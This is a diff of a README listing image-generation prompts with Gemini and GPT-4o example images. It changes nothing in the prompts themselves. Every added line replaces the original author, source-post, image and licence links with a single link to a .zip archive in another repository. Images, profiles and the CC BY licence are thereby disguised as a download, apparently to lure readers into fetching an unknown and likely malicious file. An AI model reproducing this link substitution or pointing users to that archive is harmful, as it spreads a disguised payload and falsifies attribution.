+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Character: 3D Q版情侣水晶球 (Gemini Example 42) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Character: 3D Q版情侣水晶球 (Gemini Example 42) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@balconychy</a></sub>
 
 **Prompt**
 
@@ -1742,12 +1742,12 @@ Inside the globe: The characters are in a cute chibi-style 3D design, gazing at 
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-41"></a>
-### Case 41: Miniature Three-dimensional Scene Presentation (by [@dotey](https://x.com/dotey))
+### Case 41: Miniature Three-dimensional Scene Presentation (by [@dotey](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/dotey/status/1911609122547449886)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
-<img src="cases/41/example_miniature_journey_west.png" width="300" alt="Miniature Three-dimensional Scene Presentation"><br>
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/dotey">@dotey</a></sub>
+<img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Miniature Three-dimensional Scene Presentation"><br>
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@dotey</a></sub>
 
 **Prompt**
 
@@ -1764,14 +1764,14 @@ Miniature three-dimensional scene presentation using tilt-shift photography tech
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-40"></a>
-### Case 40: Japanese-style Two-Panel Manga (Angry Girl President) (by [@hellokaton](https://x.com/hellokaton))
+### Case 40: Japanese-style Two-Panel Manga (Angry Girl President) (by [@hellokaton](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/hellokaton/status/1910900979194646959)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-XDM_nzoGX3B2jB9L7igPb.png?v=1" width="300" alt="Art Style: 日系双格漫画 (少女总统红温了) (Gemini Example 40) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/40/example_two_panel_manga_president.png" width="300" alt="Art Style: 日系双格漫画 (少女总统红温了) (Gemini Example 40) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/hellokaton">@hellokaton</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 日系双格漫画 (少女总统红温了) (Gemini Example 40) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 日系双格漫画 (少女总统红温了) (Gemini Example 40) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@hellokaton</a></sub>
 
 **Prompt**
 
@@ -1808,14 +1808,14 @@ Additional Notes:
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-39"></a>
-### Case 39: Fantasy Cartoon Illustration (by [@dotey](https://x.com/dotey))
+### Case 39: Fantasy Cartoon Illustration (by [@dotey](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/dotey/status/1905103477879267823)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-retry-RaHNLaeUbUIIBk4628lgB.png?v=1" width="300" alt="Art Style: 奇幻卡通插画 (Gemini Example 39) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/39/example_fantasy_computer_head_portal.png" width="300" alt="Art Style: 奇幻卡通插画 (Gemini Example 39) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/dotey">@dotey</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 奇幻卡通插画 (Gemini Example 39) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 奇幻卡通插画 (Gemini Example 39) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@dotey</a></sub>
 
 **Prompt**
 
@@ -1831,14 +1831,14 @@ A cartoon-style character with a smiling computer monitor as its head, wearing g
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-38"></a>
-### Case 38: Hand-drawn Infographic Card (by [@dotey](https://x.com/dotey))
+### Case 38: Hand-drawn Infographic Card (by [@dotey](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/dotey/status/1907870919852179850)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-retry-IYHHoIpU4W019PKtENm5m.png?v=1" width="300" alt="Art Style: 手绘信息图卡片 (Gemini Example 38) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/38/example_hand_drawn_infographic.png" width="300" alt="Art Style: 手绘信息图卡片 (Gemini Example 38) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/dotey">@dotey</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 手绘信息图卡片 (Gemini Example 38) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 手绘信息图卡片 (Gemini Example 38) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@dotey</a></sub>
 
 **Prompt**
 
@@ -1861,14 +1861,14 @@ Keep updating daily, and results will come — because 99% of people can’t kee
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-37"></a>
-### Case 37: Pastel Power 3D ADS (by [@aziz4ai](https://x.com/aziz4ai))
+### Case 37: Pastel Power 3D ADS (by [@aziz4ai](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/aziz4ai/status/1925301120252924356)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-retry-XwSqExH2NYE4F5AvJ_-X4.png?v=1" width="300" alt="Object: 柔和风格3D广告 (Gemini Example 37) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/37/pastel_power_3d_ads.png" width="300" alt="Object: 柔和风格3D广告 (Gemini Example 37) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/op7418">@op7418</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Object: 柔和风格3D广告 (Gemini Example 37) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Object: 柔和风格3D广告 (Gemini Example 37) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@op7418</a></sub>
 
 **Prompt**
 
@@ -1885,14 +1885,14 @@ a soft 3D cartoon-style sculpture of [brand product], made of smooth clay-like t
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-36"></a>
-### Case 36: Minimalist 3D Illustration (Markdown Format) (by [@dotey](https://x.com/dotey))
+### Case 36: Minimalist 3D Illustration (Markdown Format) (by [@dotey](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/dotey/status/1907131027253772399)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-8RSXe2tZY5rBLLfYyVpCf.png?v=1" width="300" alt="Object: 极简主义 3D 插画 (Markdown 格式) (Gemini Example 36) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/36/example_minimalist_3d_toilet_txt.png" width="300" alt="Object: 极简主义 3D 插画 (Markdown 格式) (Gemini Example 36) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/dotey">@dotey</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Object: 极简主义 3D 插画 (Markdown 格式) (Gemini Example 36) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Object: 极简主义 3D 插画 (Markdown 格式) (Gemini Example 36) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@dotey</a></sub>
 
 **Prompt**
 
@@ -1944,14 +1944,14 @@ Draw a Toilet
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-35"></a>
-### Case 35: Fluffy Jack-o'-lantern (by [gizakdag](https://x.com/gizakdag))
+### Case 35: Fluffy Jack-o'-lantern (by [gizakdag](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link1](https://x.com/gizakdag/status/1911075302941622512) | [Source Link2](https://x.com/dotey/status/1912276883196039520)
+[Source Link1](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip) | [Source Link2](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-retry-UDSfh81o50kmjmgX5BuTy.png?v=1" width="300" alt="Art Style: 毛茸茸南瓜灯 (Gemini Example 35) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/35/example_fluffy_pumpkin.png" width="300" alt="Art Style: 毛茸茸南瓜灯 (Gemini Example 35) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/gizakdag">gizakdag</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 毛茸茸南瓜灯 (Gemini Example 35) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 毛茸茸南瓜灯 (Gemini Example 35) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">gizakdag</a></sub>
 
 **Prompt**
 
@@ -1967,14 +1967,14 @@ Transform a simple flat vector icon of [🎃] into a soft, 3D fluffy object. The
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-34"></a>
-### Case 34: Hand-drawn Infographic Card (Cognition) (by [@dotey](https://x.com/dotey))
+### Case 34: Hand-drawn Infographic Card (Cognition) (by [@dotey](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/dotey/status/1907903480678985784)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-ypjUbOaP1AqH_HBZ4VisI.png?v=1" width="300" alt="Art Style: 手绘信息图卡片 (Gemini Example 34) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/34/example_hand_drawn_infographic_cognition.png" width="300" alt="Art Style: 手绘信息图卡片 (Gemini Example 34) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/dotey">@dotey</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 手绘信息图卡片 (Gemini Example 34) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 手绘信息图卡片 (Gemini Example 34) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@dotey</a></sub>
 
 **Prompt**
 
@@ -2000,14 +2000,14 @@ The overall layout should maintain visual balance, with ample white space reserv
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-33"></a>
-### Case 33: Family Wedding Photo (Q-version) (by [@balconychy](https://x.com/balconychy))
+### Case 33: Family Wedding Photo (Q-version) (by [@balconychy](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/balconychy/status/1909426314643222595)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-ZhHgKkryQe_e62gJyMpj8.png?v=1" width="300" alt="Character: 全家福婚纱照 (Gemini Example 33) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/33/example_family_wedding_photo_q.png" width="300" alt="Character: 全家福婚纱照 (Gemini Example 33) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/balconychy">@balconychy</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Character: 全家福婚纱照 (Gemini Example 33) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Character: 全家福婚纱照 (Gemini Example 33) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@balconychy</a></sub>
 
 **Prompt**
 
@@ -2028,14 +2028,14 @@ The entire scene is placed inside a photo frame.
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-32"></a>
-### Case 32: 3D Papercraft Pop-up Book (by [@dotey](https://x.com/dotey))
+### Case 32: 3D Papercraft Pop-up Book (by [@dotey](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/dotey/status/1923264349050675329)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-retry-dHSoKQFhVLIqAdUKxXzwQ.png?v=1" width="300" alt="Art Style: 折叠式纸雕立体绘本 (Gemini Example 32) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/32/3d_papercraft_popup_book.png" width="300" alt="Art Style: 折叠式纸雕立体绘本 (Gemini Example 32) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/dotey">@dotey</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 折叠式纸雕立体绘本 (Gemini Example 32) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 折叠式纸雕立体绘本 (Gemini Example 32) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@dotey</a></sub>
 
 **Prompt**
 
@@ -2052,14 +2052,14 @@ Multi-layered foldable paper sculpture pop-up book, placed on a desk, with a cle
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-31"></a>
-### Case 31: Anime Sticker Collection (by [@richardchang](https://x.com/richardchang))
+### Case 31: Anime Sticker Collection (by [@richardchang](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/richardchang/status/1909086122959139312)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-qVK6fm-fP8a4.jpeg" width="300" alt="动漫贴纸集合 (Gemini Example 31) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/31/example_naruto_stickers.png" width="300" alt="动漫贴纸集合 (Gemini Example 31) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/richardchang">@richardchang</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="动漫贴纸集合 (Gemini Example 31) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="动漫贴纸集合 (Gemini Example 31) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@richardchang</a></sub>
 
 **Prompt**
 
@@ -2075,14 +2075,14 @@ Naruto stickers
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-30"></a>
-### Case 30: 35mm Film Style Flying Island (by [@dotey](https://x.com/dotey))
+### Case 30: 35mm Film Style Flying Island (by [@dotey](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/dotey/status/1905020833451348283)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-YDjMSDxDmJiQmon9y0aQx.png?v=1" width="300" alt="Art Style: 35mm 胶片风格飞岛 (Gemini Example 30) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/30/example_35mm_moscow_flying_island.png" width="300" alt="Art Style: 35mm 胶片风格飞岛 (Gemini Example 30) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/dotey">@dotey</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 35mm 胶片风格飞岛 (Gemini Example 30) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 35mm 胶片风格飞岛 (Gemini Example 30) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@dotey</a></sub>
 
 **Prompt**
 
@@ -2098,14 +2098,14 @@ Naruto stickers
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-29"></a>
-### Case 29: Famous Painting Character OOTD (by [@ZHO_ZHO_ZHO](https://x.com/ZHO_ZHO_ZHO))
+### Case 29: Famous Painting Character OOTD (by [@ZHO_ZHO_ZHO](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/ZHO_ZHO_ZHO/status/1909892294217781714)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
